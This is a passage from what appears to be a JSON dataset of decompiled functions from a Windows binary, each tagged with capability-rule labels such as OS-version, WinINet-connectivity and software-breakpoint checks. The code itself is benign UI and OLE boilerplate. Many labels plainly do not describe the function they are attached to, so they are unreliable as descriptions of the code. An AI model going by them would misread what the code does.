            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00415974(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, uint *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    uint32_t *puVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    int32_t pvargDest;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = arg_1ch;\n    piVar5 = arg_8h;\n    iVar9 = 0;\n    var_20h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar6 + iVar9;\n            iVar9 = iVar9 + 0x10;\n        } while (arg_8h < puVar6[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar9 = arg_8h * 0x10 + *puVar6;\n        iVar8 = uVar2 - arg_8h;\n        piVar10 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar10 = iVar9;\n            iVar9 = iVar9 + 0x10;\n            piVar10 = piVar10 + -1;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar9 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_20h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvargDest);\n    pcVar4 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x00415ede;\n    // switch table (19 cases) at 0x415ef4\n    switch(*((arg_ch + 0x139aU) * 4 + 0x415ef4)) {\n    case 0x415a51:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 100))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415a72:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x00415c6a;\n                var_44h = &pvargDest;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar9 = (*pcVar4)(&pvargDest, var_40h, 0, 3);\n                if (iVar9 < 0) {\ncode_r0x00415e56:\n                    *arg_28h = 1;\n                    goto code_r0x00415ede;\n                }\n                var_40h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x60))(piVar5, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415adf:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x00415c6a;\n                var_44h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x5c))(piVar5, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415b2c:\n        if (puVar6[2] == 5) {\n            while ((uVar1 = *var_44h,  (uVar1 & 0x4000) != 0 && ((uVar1 & 0xf) != 0))) {\n                if ((uVar1 & 0xc) == 0) {\n                    pvargDest = var_44h[2];\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                    *var_44h[2] = 3;\n                    pvargDest = var_44h[2] + 8;\n                }\n            }\n            *arg_28h = 0;\n            iVar9 = (**(*piVar5 + 0x58))\n                              (piVar5, pvargDest, var_ch, var_8h, var_4h, *var_34h, var_34h[1], var_34h[2], var_34h[3]);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415b95:\n        if (puVar6[2] == 2) {\n            if (*var_44h != 3) {\n                iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_44h, 0, 3);\n                if (iVar9 < 0) goto code_r0x00415c6a;\n                var_44h = &pvargDest;\n            }\n            iVar9 = (**(*piVar5 + 0x54))(piVar5, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415bdf:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x50))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x00415e0d:\n            if (-1 < iVar9) {\n                *arg_20h = 8;\n            }\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415c07:\n        iVar9 = (**(*piVar5 + 0x4c))(piVar5, arg_20h);\n        goto code_r0x00415ede;\n    case 0x415c15:\n        iVar9 = (**(*piVar5 + 0x48))(piVar5, arg_20h);\n        goto code_r0x00415ede;\n    case 0x415c23:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x44))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415e0d;\n        }\n        break;\n    case 0x415c4b:\n        if (puVar6[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar9 = -0x7ffdfffb;\ncode_r0x00415c6a:\n                *arg_28h = 0;\n                goto code_r0x00415ede;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar7 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar7 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar7 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar9 = (**(*piVar5 + 0x40))(piVar5, puVar7, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x00415eb3;\n        }\n        break;\n    case 0x415ccd:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x3c))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415e0d;\n        }\n        break;\n    case 0x415cf5:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x38))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415d19:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x34))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x00415ede;\n        }\n        break;\n    case 0x415d3d:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x30))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415e0d;\n        }\n        break;\n    case 0x415d65:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x00415de6;\n            if (puVar6[2] == 2) {\n                var_30h = *var_44h;\n                uStack48 = var_44h[1];\n                uStack44 = var_44h[2];\n                uStack40 = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_40h, 0, 3);\n                    if (iVar9 < 0) goto code_r0x00415e56;\n                    var_40h = &pvargDest;\n                }\n                iVar9 = (**(*piVar5 + 0x6c))(piVar5, var_30h, uStack48, uStack44, uStack40, var_40h[2]);\n                goto code_r0x00415ede;\n            }\n        }\n        else if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x2c))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415e0d;\n        }\n        break;\n    case 0x415de6:\ncode_r0x00415de6:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x00415e7e;\n            if (puVar6[2] == 2) {\n                var_30h = *var_44h;\n                uStack48 = var_44h[1];\n                uStack44 = var_44h[2];\n                uStack40 = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar9 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&pvargDest, var_40h, 0, 3);\n                    if (iVar9 < 0) goto code_r0x00415e56;\n                    var_40h = &pvargDest;\n                }\n                iVar9 = (**(*piVar5 + 0x68))(piVar5, var_30h, uStack48, uStack44, uStack40, var_40h[2]);\n                goto code_r0x00415ede;\n            }\n        }\n        else if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x28))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415e0d;\n        }\n        break;\n    case 0x415e7e:\ncode_r0x00415e7e:\n        if (puVar6[2] == 1) {\n            iVar9 = (**(*piVar5 + 0x24))(piVar5, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00415ed0;\n        }\n        break;\n    case 0x415ea6:\n        iVar9 = (**(*piVar5 + 0x20))(piVar5, arg_20h + 2);\ncode_r0x00415eb3:\n        if (-1 < iVar9) {\n            *arg_20h = 3;\n        }\n        goto code_r0x00415ede;\n    case 0x415ec3:\n        iVar9 = (**(*piVar5 + 0x1c))(piVar5, arg_20h + 2);\ncode_r0x00415ed0:\n        if (-1 < iVar9) {\n            *arg_20h = 9;\n        }\n        goto code_r0x00415ede;\n    }\n    iVar9 = -0x7ffdfff2;\ncode_r0x00415ede:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&pvargDest);\n    return iVar9;\n}\n",
        "token_count": 3759
    },
    "00415f40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00415f40(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x4b63d8));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x4b6388);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 306
    },
    "0041619b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041619b(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "004162ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004162ae(int32_t *param_1, int32_t param_2, uint *param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[8];\n    if (param_2 != 2) {\n        iVar1 = (**(*param_1 + 0x70))(param_2);\n        if (iVar1 != 0) {\n            iVar2 = *(iVar1 + 0x20);\n            param_2 = 2;\n        }\n    }\n    *param_3 = 0x1c;\n    (*_sym.imp.USER32.dll_SetScrollInfo)(iVar2, param_2, param_3, param_4);\n    return 1;\n}\n",
        "token_count": 173
    },
    "004162eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004162eb(int32_t *param_1, int32_t param_2, uint *param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[8];\n    if (param_2 != 2) {\n        iVar1 = (**(*param_1 + 0x70))(param_2);\n        if (iVar1 != 0) {\n            iVar2 = *(iVar1 + 0x20);\n            param_2 = 2;\n        }\n    }\n    *param_3 = 0x1c;\n    param_3[1] = param_4;\n    (*_sym.imp.USER32.dll_GetScrollInfo)(iVar2, param_2, param_3);\n    return;\n}\n",
        "token_count": 179
    },
    "00416336": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416336(int32_t *arg_8h, uint hWnd, int32_t *lprc2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpRect;\n    uint var_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(hWnd);\n    if ((arg_8h == NULL) || (*arg_8h != 0)) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar2, &lpRect);\n        (*pcVar1)(uVar2, &var_8h);\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lpRect, lprc2);\n        if (iVar3 == 0) {\n            if (arg_8h == NULL) {\n                (*_sym.imp.USER32.dll_SetWindowPos)\n                          (hWnd, 0, *lprc2, lprc2[1], lprc2[2] - *lprc2, lprc2[3] - lprc2[1], 0x14);\n            }\n            else {\n                iVar3 = (*_sym.imp.USER32.dll_DeferWindowPos)(*arg_8h);\n                *arg_8h = iVar3;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "004163c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004163c2(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    uVar1 = fcn.0041be4f();\n    if (param_2 == 0) {\n        uVar1 = uVar1 & 0xfffffdff;\n    }\n    uVar2 = fcn.0041be35(0, uVar1);\n    (*_sym.imp.USER32.dll_AdjustWindowRectEx)(param_1, uVar2);\n    return;\n}\n",
        "token_count": 123
    },
    "0041696d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041696d(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00416a03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00416a03(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00416a97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00416a97(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00416b46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00416b46(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00416bdd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00416bdd(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00416c6b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00416c6b(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00416f98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00416f98(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = fcn.004302e1();\n    if ((*(iVar4 + 0x3c) != 0) && (iVar1 = *(*(iVar4 + 0x3c) + 0x20),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0x50);\n    if ((param_1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x164))(0xffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "0041726d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041726d(int32_t *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    \n    if (param_2 == 3) {\n        fcn.0041726d(0, param_3);\n        param_2 = 1;\n    }\n    iVar1 = (**(*param_1 + 0x70))(param_2);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_ShowScrollBar)(param_1[8], param_2, unaff_ESI);\n    }\n    else {\n        fcn.0041bfb6();\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "004172f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004172f7(uint XAmount, int32_t YAmount, int32_t arg_10h, int32_t lpClipRect)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint uVar4;\n    uint lpRect;\n    int32_t Y;\n    uint uStack12;\n    uint *puStack8;\n    \n    iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(in_ECX + 0x20));\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (((iVar3 == 0) && (arg_10h == 0)) && (lpClipRect == 0)) {\n        uVar4 = 5;\n        iVar3 = *(in_ECX + 0x20);\n        while (iVar3 = (*pcVar1)(iVar3, uVar4),  iVar3 != 0) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(iVar3, &fcn.004172f7::lpRect);\n            puStack8 = &fcn.004172f7::lpRect;\n            uStack12 = 0x41733c;\n            fcn.0042dd8a();\n            iVar2 = Y;\n            uStack12 = 0x15;\n            Y = 0;\n            lpRect = 0;\n            (*_sym.imp.USER32.dll_SetWindowPos)(iVar3, 0, XAmount, iVar2 + YAmount);\n            uVar4 = 2;\n        }\n    }\n    else {\n        (*_sym.imp.USER32.dll_ScrollWindow)(*(in_ECX + 0x20), XAmount, YAmount, arg_10h, lpClipRect);\n    }\n    if ((*(in_ECX + 0x4c) != 0) && (arg_10h == 0)) {\n        (**(**(in_ECX + 0x4c) + 0x5c))(XAmount, YAmount);\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "00417db5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00417db5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (*(param_1 + 0x4c) != 0) {\n        iVar1 = *(*(param_1 + 0x4c) + 0x44);\n        while (iVar1 != 0) {\n            piVar2 = fcn.00416670();\n            if ((*(*piVar2 + 4) != 0) && (*(*(*piVar2 + 4) + 0x74) != 0)) {\n                iVar3 = iVar3 + 1;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 180
    },
    "00417dfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00417dfb(uint arg_8h, uint noname_1, int32_t arg_10h, uint noname_3, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h, int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0041661b(arg_18h, arg_1ch, arg_20h, arg_24h, arg_8h);\n    if (iVar1 < 0) {\n        (**(**(in_ECX + 0x28) + 0x20))(*(in_ECX + 0x28), &var_4h);\n        iVar2 = fcn.00417db5();\n        if (arg_10h <= iVar2 + var_4h) {\n            var_8h = *(*(in_ECX + 0x4c) + 0x44);\n            while (var_8h != 0) {\n                piVar3 = fcn.00416670(&var_8h);\n                iVar2 = *(*piVar3 + 4);\n                if (iVar2 != 0) {\n                    if (*(iVar2 + 0x74) != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    if (var_4h == arg_10h) {\n                        iVar1 = *(*piVar3 + 4);\n                        var_18h = *(iVar1 + 0x30);\n                        var_14h = *(iVar1 + 0x34);\n                        var_10h = *(iVar1 + 0x38);\n                        var_ch = *(iVar1 + 0x3c);\n                        fcn.0042ddc6(&var_18h);\n                        *arg_18h = var_18h;\n                        *arg_1ch = var_14h;\n                        *arg_20h = var_10h - var_18h;\n                        *arg_24h = var_ch - var_14h;\n                        iVar1 = 0;\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 558
    },
    "004182f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004182f8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(*(param_1 + 0xc));\n        *(param_1 + 4) = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(param_1 + 0xc));\n            *(param_1 + 4) = iVar1;\n            *(param_1 + 8) = iVar1 != 0;\n        }\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 160
    },
    "0041832a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
